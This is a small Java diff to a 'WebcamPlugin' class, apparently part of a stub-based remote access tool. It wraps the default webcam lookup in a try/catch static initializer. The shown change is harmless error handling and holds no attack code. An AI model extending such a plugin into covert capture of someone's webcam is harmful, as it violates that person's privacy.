@@ -23,7 +23,15 @@ public class WebcamPlugin extends StubPlugin {
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
 	public static boolean enabled;
-	public static Webcam cam = com.github.sarxos.webcam.Webcam.getDefault();
+	public static Webcam cam;
+	
+	static {
+		try {
+			cam = com.github.sarxos.webcam.Webcam.getDefault();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
 
 	public void onEnable() throws Exception {
 		
